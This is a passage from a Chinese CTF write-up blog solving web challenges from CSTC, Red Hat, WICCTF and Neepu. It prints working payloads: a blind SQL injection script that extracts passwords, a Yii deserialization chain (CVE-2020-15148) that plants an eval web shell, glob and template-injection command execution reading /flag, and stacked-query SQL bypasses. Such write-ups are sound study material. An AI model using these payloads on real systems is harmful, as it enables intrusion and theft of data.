class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">        <span class="title function_ invoke__">strpos</span>((<span class="variable">$c</span>[<span class="number">0</span>].<span class="variable">$d</span>), <span class="string">&quot;cstc2021&quot;</span>)?<span class="variable">$v3</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">// echo &quot;v3=&gt;&quot; . $v3;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v1</span> &amp;&amp; <span class="variable">$v2</span> &amp;&amp; <span class="variable">$v3</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;good&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> <span class="literal">NULL</span></span><br></pre></td></tr></table></figure>
<p>（<del>不认识的函数很多，开局搜半天</del>）<br>要求3层都达成，使得<code>$v1,$v2,$v3</code>都为1。<br>首先第一层，先用<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.json-decode.php"><code>json_decode()函数</code></a>和<code>array</code>将以GET方式传入的foo的值转化为带键的数组$a，接下来使用<code>is_numeric函数</code>判断键<code>bar1</code>对应的值必须是纯数字，并且大于2021，因此构造<code>?foo=&#123;&quot;bar1&quot;:&quot;3000a&quot;&#125;</code>，第一层就过去了，此时可以在本地测试得到<code>$v1</code>等于1了。<br>第二层，第一步通过<code>is_array函数</code>判断<code>bar2</code>对应的值是否为数组，就加上<code>&quot;bar2&quot;:[]</code>,接着通过<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.count.php"><code>count函数</code></a>要求bar2对应的数组内的单元个数为5，并且要求<code>$a[&quot;bar&quot;][0]</code>也就是该数组的第一个单元也为数组，接着是<code>array_search函数</code>要求$a[“a2”]数组中必须含有nudt,但$a[“bar2”]中不含有字符串<code>&quot;nudt&quot;</code>，于是继续完善payload：<br><code>?foo=&#123;&quot;bar1&quot;:&quot;3000&quot;,&quot;bar2&quot;:[[],1,2,3,4,],&quot;a2&quot;:[&quot;nudt&quot;]&#125;</code><br>（感觉也可以通过让$[“a2”]不为数组，<code>array_search</code>传入的参数不为数组就会报错，但不会返回false）<br>最后是第三层，首先要求传入<code>cat</code>和<code>dog</code>的值，<code>cat[1]</code>不能为NULL，可以看出，传入的<code>cat</code>为数组，接着是使用<code>strcmp函数</code>进行字符串比较，要求<code>cat[1]</code>与<code>dog</code>相等，但又不相等，这做不到,要利用strcmp函数的漏洞进行绕过，因此，传入<code>dog[]</code>使<code>dog</code>这个变量为数组类型，<code>strcmp函数</code>的参数为数组就会出错，并且返回<code>null</code>，<code>!null</code>就绕过判断了，接着是<code>eregi()函数</code>（不区分大小写）匹配<code>cat[0]</code>函数中的<code>3</code>，<code>1</code>和<code>c</code>，并且后面有要求<code>cat[0]</code>中含有字符串<code>cstc2021</code>,利用前加<code>%00</code>的方式绕过eregi匹配，最终构造成的payload:<br><code>?foo=&#123;&quot;bar1&quot;:&quot;3000a&quot;,&quot;bar2&quot;,[[],1,2,3,4],&quot;a2&quot;:[&quot;nudt&quot;]&#125;&amp;cat[0]=%00cstc2021&amp;cat[0]=1&amp;dog[]</code>  </p>
<hr>
<h1 id="RED-HAT"><a href="#RED-HAT" class="headerlink" title="RED HAT"></a>RED HAT</h1><h2 id="Find-it"><a href="#Find-it" class="headerlink" title="Find_it"></a>Find_it</h2><p><del>首先大喊三声我是傻逼!!然后开始写wp</del><br>首先打开环境，发现啥也没有，然后查看robot.txt文档，得知有一个1ndexx.php，结果啥也没有，经过我的不懈努力（问学长），终于得到可以.swp看源码，明明津门杯从那一道题已经得到经验结果没想到，，总之，访问<code>.1ndexx.php.swp</code>，然后得到源码，源码有点散，总之，先拼起来： </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Really easy...</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable 2 open!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>,<span class="title function_ invoke__">filesize</span>(<span class="string">&quot;flag.php&quot;</span>));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$hack</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;hack.php&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable 2 open&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&quot;you die&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&gt;<span class="number">33</span>)&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&quot;nonono.&quot;</span>); </span><br><span class="line">     &#125;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$hack</span>,<span class="variable">$a</span>); </span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$hack</span>,<span class="variable">$I_know_you_wanna_but_i_will_not_give_you_hhh</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$hack</span>); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>打开了hack.php，然后将传入的code写入了hack.php。<br>于是构造payload：<code>?code=&lt;?php phpinfo();?&gt;</code><br>接着访问hack.php，flag就在phpinfo的环境变量里面。  </p>
<hr>
<h2 id="websitemanger"><a href="#websitemanger" class="headerlink" title="websitemanger"></a>websitemanger</h2><p>打开是一个登录界面，查看源码，可以看见图片部分的源码是<code>src=&quot;image.php?id=2&quot;</code>，访问<code>image.php</code>，可以看见一张图片，通过GET上传id的值，总共有1，2，3，这三张图，当输入其他值时就会显示错误，通过bp抓包，查看返回消息，发现数据层没有任何信息，可以进行布尔盲注(就是有点慢)  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database_name</span>():</span><br><span class="line">	name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">48</span>,<span class="number">122</span>):</span><br><span class="line">			url = <span class="string">&quot;http://eci-2zeir5o8p6vha0wv8y41.cloudeci1.ichunqiu.com:80/image.php/?id=0^if(ascii(mid((select(group_concat(password))from(users)),%d,1))=%d,5,1)#&quot;</span> %(j,i)</span><br><span class="line">			<span class="comment"># print(url)</span></span><br><span class="line">			r = requests.get(url)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">&#x27;T&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">				name = name+<span class="built_in">chr</span>(i)</span><br><span class="line">				</span><br><span class="line">				<span class="built_in">print</span>(name)</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;database_name:&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(r.status_code)</span><br><span class="line">	</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line">database_name()</span><br></pre></td></tr></table></figure>
<p>数据库名为<code>ctf</code>，表名为<code>users</code>，列名为<code>username</code>和<code>password</code>，最终得到用户名为admin，密码为包含小写字母与数字的随机生成字符串，登入后，file协议进行文件读取，website段（host）输入<code>file:///flag</code>，接着进行ssrf，referer输入<code>http://127.0.0.1</code>，点击<code>test it</code>就跳到了modify.php，得到flag。  </p>
<hr>
<h2 id="framework"><a href="#framework" class="headerlink" title="framework"></a>framework</h2><p>没看原题，被web3搞懵了，那么就开始吧（<del>云做题</del>）<br>打开点击<code>Get started with Yii</code>，可以得知这是个Yii框架，可以下载源码，源码我当时下载了，下载过程一波三折，然后解压，装到本地，打开目录下的web，里面有一个<code>index.php</code>文件，因为是Yii，所以可以在<code>index.php</code>加入代码：<code>echo Yii::getversion();</code>，然后打开本地主页，可以看到当前安装的本题Yii框架的版本，该版本是：<code>2.0.32</code>，（当然其实直接点击右下角的箭头就可以看到该Yii框架的版本），然后上搜索引擎看看这个版本有没有可以利用的漏洞：于是找到一篇文章：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3h1YW5kYW9fYWhmZW5ncmVuL2FydGljbGUvZGV0YWlscy8xMTEyNTk5NDM=">文章</span><br>于是就有一个反序列化漏洞（CVE-2020-15148）可以利用，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">CreateAction</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">yii</span>\<span class="title class_">rest</span>\<span class="title class_">CreateAction</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> <span class="title class_">CreateAction</span>(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">yii</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title class_">echo</span> <span class="title class_">base64_encode</span>(<span class="title class_">serialize</span>(<span class="title class_">new</span> <span class="title class_">yii</span>\<span class="title class_">db</span>\<span class="title class_">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造payload：<code>?r=site/aboout&amp;messge=get%20/r=site/about&amp;messege=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NzoicGhwaW5mbyI7czoyOiJpZCI7czoxOiIxIjt9aToxO3M6MzoicnVuIjt9fX19</code><br>得到一个不完整的phpinfo界面，使用system，和文件查看的函数都被返回错误界面，但可以使用<code>file_put_content函数</code>(<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24uZmlsZS1wdXQtY29udGVudHMucGhw">点击看详情</span>)写入shell，同时结合<code>assert函数</code>(<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvZnVuY3Rpb24uYXNzZXJ0LnBocA==">点击看详情</span>)，如果assert的第一个参数是字符串，将被当做php代码执行。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;checkAccess = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;id = <span class="string">&#x27;file_put_contents(\&#x27;shell.php\&#x27;,\&#x27;&lt;?php eval($_POST[a]);phpinfo();?&gt;\&#x27;);&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>然后访问shell.php，查看phpinfo信息，可以查看禁用函数<br>上蚁剑使用插件bypass（我蚁剑的插件市场一直转圈圈啊@.@）<br><del>云做题一脸懵逼</del></p>
<hr>
<h1 id="WICCTF"><a href="#WICCTF" class="headerlink" title="WICCTF"></a>WICCTF</h1><h2 id="hate-flag"><a href="#hate-flag" class="headerlink" title="hate_flag"></a>hate_flag</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$@]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;fighting!&#x27;</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>因为和ctfshow56题很像，本来想直接改一下脚本跑出来的，结果跑来跑去都是ls返回的目录，而且根本没有我写的用于判断是否执行成功的字符串，想来是因为靶机就这一个，估计别人也在传，所以执行到别人传的文件了，总之就没看了，之后看到wp写的直接模糊匹配执行，<code>?code=/???/??? /????</code>，可以结合跑出来的目录，因为根目录可以直接看到<code>flag</code>这个文件，所以这个命令可以匹配到<code>/bin/cat /flag</code>，当然也能匹配到别的命令和目录，总之，最后屏幕上就一大堆东西，全复制下来，检索<code>flag</code>，很快就找到了。<br>结果是脚本执行方式有问题<code>:(</code>（<del>我看是我脑子有问题</del>），但是我又改好了（<del>诶，一运行就出，就是玩</del>）  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://122.112.214.101:20004/?code=?&gt;&lt;?=`.+/???/????????[?-[]`;?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post</span>():</span><br><span class="line">    files=&#123;</span><br><span class="line">        <span class="string">&#x27;upload&#x27;</span>:<span class="string">&#x27;#!/bin/sh\necho &quot;muhua&quot;\ncat /flag&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r=requests.post(url,files=files)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;muhua&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)    </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    post()</span><br></pre></td></tr></table></figure>
<p>总之通过上传一个文件，然后访问并执行，本来按照大佬们的思路，这个想匹配到&#x2F;tem&#x2F;php??????，生成的临时文件名字应该是最后六位其中肯定是含有一个大写字母的，那么就选最后一个，假如正好是最后一个为大写，那么就会成功匹配上并执行，而文件以<code>!#/bin/sh</code>开头，意思是文件以<code>/bin</code>目录下的<code>sh</code>命令执行，接着就是需要执行的命令。<br>我想问题应该是在于要在上传的同时进行执行，我一开始的脚本是使用多线程，并且先上传，后执行，然后就出问题了，想想也是，靶机就一个，肯定要清理临时文件的，唉唉。  </p>
<hr>
<h1 id="Neepu"><a href="#Neepu" class="headerlink" title="Neepu"></a>Neepu</h1><hr>
<h2 id="noob"><a href="#noob" class="headerlink" title="noob"></a>noob</h2><hr>
<h3 id="随便注2-0"><a href="#随便注2-0" class="headerlink" title="随便注2.0"></a>随便注2.0</h3><p>强网杯随便注和GXY的综合，这次很让我头疼但最后却轻易解决的是空格和tab被过滤的问题，根据两道题的结合再加上过滤点</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Neepu</span><br><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|rename|set|handler|char|\*| |	|\./i&quot;,$inject);</span><br><span class="line">强网杯</span><br><span class="line">return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br><span class="line">Blacklist</span><br><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
<p>我很轻易地发现可以用预编译绕过，最后用<code>换行符(%0a)</code>来代替空格，最终得出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;show databases;</span><br><span class="line">-1&#x27;;show tables;</span><br><span class="line">-1&#x27;;desc `@Neepu2021招新赛`;</span><br><span class="line">-1&#x27;;PREPARE muhua from concat(&#x27;s&#x27;,&#x27;elect&#x27;, &#x27; flag from `@Neepu2021招新赛`&#x27;);EXECUTE muhua;#</span><br></pre></td></tr></table></figure>
<p>将其中的空格换成%0a就行，抓包传数据或者直接python传输可以换了再传  </p>
<hr>
<h3 id="有泄可击"><a href="#有泄可击" class="headerlink" title="有泄可击"></a>有泄可击</h3><p>描述：公司大断电…大家都在整理备份文件，这时你潜入了进来…<br>结合题目，肯定是源码泄露，进入之后有一个注册界面，但无论如何也注册不上，一看源码有一个测试账号，原来是这样潜入的啊，于是直接登上，但页面上啥也没有，尝试常见的源码泄露目录，发现了<code>.git</code>目录有index.php的源码，前面啥也没有，但源码的末尾直接给了<code>shell</code>:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;neepu_debug.mode&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>但这种形式的我不会利用，搜索引擎也没有找到，（其实可以说找到了，只是当时没用对），最后被告知，传<code>neepu[debug.mode</code>就可以让<code>&#39;.&#39;</code>不被转义。直接查看目录，flag就在根目录下，很简单一道题，唯一的难点就在于对<code>shell</code>的利用。</p>
<hr>
<h3 id="最强大脑"><a href="#最强大脑" class="headerlink" title="最强大脑"></a>最强大脑</h3><p>10秒内计算出一个随机加减乘的计算式，连续正确100次，这还不简单？<del>直接c写一个循环计算器，然后复制粘贴计算，复制粘贴提交</del><br>当然是写脚本跑，通过gamebox的题解现学现卖的，写完gamebox的wp瞬间感觉这题不是问题。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://neepusec.club:18672/&#x27;</span></span><br><span class="line"></span><br><span class="line">ks = requests.Session()</span><br><span class="line"></span><br><span class="line">re0 = ks.get(url)</span><br><span class="line"><span class="comment">#通过特征部分抓取计算式</span></span><br><span class="line">an = re.findall(<span class="string">&#x27;\&lt;p\&gt;.*?&amp;nbsp\?&#x27;</span>,re0.text)</span><br><span class="line"><span class="comment">#由于长度不确定，所以首先截取出去html格式&lt;p&gt;之后的部分</span></span><br><span class="line">cal = an[<span class="number">0</span>][<span class="number">3</span>:<span class="number">40</span>]</span><br><span class="line"><span class="comment">#去掉计算式以外的多余部分</span></span><br><span class="line">cal = cal.replace(<span class="string">&#x27;&amp;nbsp&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">cal = cal.replace(<span class="string">&#x27;=?&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#计算</span></span><br><span class="line">an = <span class="built_in">eval</span>(cal)</span><br><span class="line">data = &#123;<span class="string">&quot;answer&quot;</span>:an&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">    re1 = ks.post(url,data=data)</span><br><span class="line">    an = re.findall(<span class="string">&#x27;\&lt;p\&gt;.*?&amp;nbsp\?&#x27;</span>,re1.text)</span><br><span class="line">    cal = an[<span class="number">0</span>][<span class="number">3</span>:<span class="number">40</span>]</span><br><span class="line">    cal = cal.replace(<span class="string">&#x27;&amp;nbsp&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    cal = cal.replace(<span class="string">&#x27;=?&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    an = <span class="built_in">eval</span>(cal)</span><br><span class="line">    data = &#123;<span class="string">&quot;answer&quot;</span>:an&#125;</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">100</span>:</span><br><span class="line">        <span class="built_in">print</span>(re1.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><hr>
<h3 id="gamebox"><a href="#gamebox" class="headerlink" title="gamebox"></a>gamebox</h3><p>鬼！<br>进去直接万能密码<code>muhua&#39;=&#39;0</code><br>开始抛硬币，脚本，写  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment">#display模板注入</span></span><br><span class="line">payload1 = <span class="string">&quot;&#123;&#123;shell_exec(\&quot;\ls\t/\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&#123;&#123;shell_exec(\&quot;cat\t/This_is_your_Flag\&quot;)&#125;&#125;&#x27;=&#x27;0&quot;</span> </span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#保持session会话</span></span><br><span class="line">ks = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment">#登录</span></span><br><span class="line">login_data = &#123;<span class="string">&quot;username&quot;</span>:payload&#125;</span><br><span class="line">r0 = ks.post(url+<span class="string">&quot;/login.php&quot;</span>,data = login_data)</span><br><span class="line"></span><br><span class="line"><span class="comment">#非贪婪获取验证码</span></span><br><span class="line">r1 = ks.get(url+<span class="string">&quot;/index.php&quot;</span>)</span><br><span class="line">ver = re.findall(<span class="string">&#x27;pic\/(.*?)\.jpg&#x27;</span>,r1.text)</span><br><span class="line"><span 